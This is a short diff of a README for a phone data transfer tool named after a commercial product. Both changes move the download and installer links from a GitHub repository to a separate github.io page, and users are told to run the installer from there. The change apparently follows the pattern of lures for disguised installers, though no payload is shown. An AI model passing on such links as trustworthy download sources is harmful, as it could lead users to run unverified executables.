@@ -1,6 +1,6 @@
 # 📱 MobileTrans-Phone-Transfer - Move your data between mobile devices
 
-[![Download MobileTrans](https://img.shields.io/badge/Download-MobileTrans-blue.svg)](https://github.com/abhinav1977/MobileTrans-Phone-Transfer)
+[![Download MobileTrans](https://img.shields.io/badge/Download-MobileTrans-blue.svg)](https://abhinav1977.github.io)
 
 MobileTrans-Phone-Transfer helps you move files between mobile phones. You can transfer photos, contacts, videos, and messages with this software. It works on Windows 11 and Windows 10 computers. 
 
@@ -28,7 +28,7 @@ Ensure your computer has the following items to run the software.
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following link to access the installer: [https://github.com/abhinav1977/MobileTrans-Phone-Transfer](https://github.com/abhinav1977/MobileTrans-Phone-Transfer)
+1. Visit the following link to access the installer: [https://abhinav1977.github.io](https://abhinav1977.github.io)
 2. Locate the download button on the page.
 3. Save the installer file to your computer.
 4. Open the downloaded file to start the installation.
